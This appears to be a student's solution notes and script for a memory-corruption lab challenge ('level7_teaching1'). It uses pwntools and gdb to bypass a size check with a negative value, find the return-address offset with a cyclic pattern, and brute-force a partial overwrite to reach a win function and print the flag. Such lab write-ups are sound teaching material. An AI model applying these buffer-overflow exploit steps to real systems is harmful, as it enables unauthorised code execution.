"""
check pwn with: pwn checksec <bin_file_name>

Terminal 1:
import pwn
io = pwn.process("/challenges/mem/level7_teaching1")
#TODO: get <pid>

Terminal 2: 
gdb -p <pid>
c

Terminal 1:
io.send("-1\n") # neg value because there is a check for the max value (0x3e)
io.send(pwn.cyclic(1000, n=8))

Terminal 2: 
#TODO: get return addr <retq>

Terminal 1: 
pwn.cyclic_find(<retq>, n=8) #prints starting position of return address

Terminal 2: 
p win #prints address of win function

Run script below. Note where the numbers are from.
"""
import pwn

dis = 136
last3 = 0x878
for _ in range(32):
  io = pwn.process("/challenges/mem/level7_teaching1")
  io.send("138\n")
  io.send(b"a"*136 + pwn.p16(last3))
  output = io.readall().decode('ascii')
  if "sutd_syssec" in output:
    print(output)
    break